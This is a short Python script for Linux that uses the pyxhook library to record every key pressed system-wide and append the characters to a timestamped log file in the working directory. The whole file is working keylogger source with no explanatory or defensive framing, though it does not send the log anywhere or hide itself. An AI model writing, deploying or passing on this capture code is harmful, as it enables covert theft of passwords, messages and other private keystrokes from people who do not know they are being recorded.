import os
from datetime import datetime
import pyxhook

def main():
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    def OnKeyPress(event):

        with open(log_file, "a") as f:  
            if event.Key == 'P_Enter' :
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()

    try:
        new_hook.start()
    except KeyboardInterrupt:
        new_hook.cancel()
        pass
    except Exception as ex:
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")


if __name__ == "__main__":
    main()
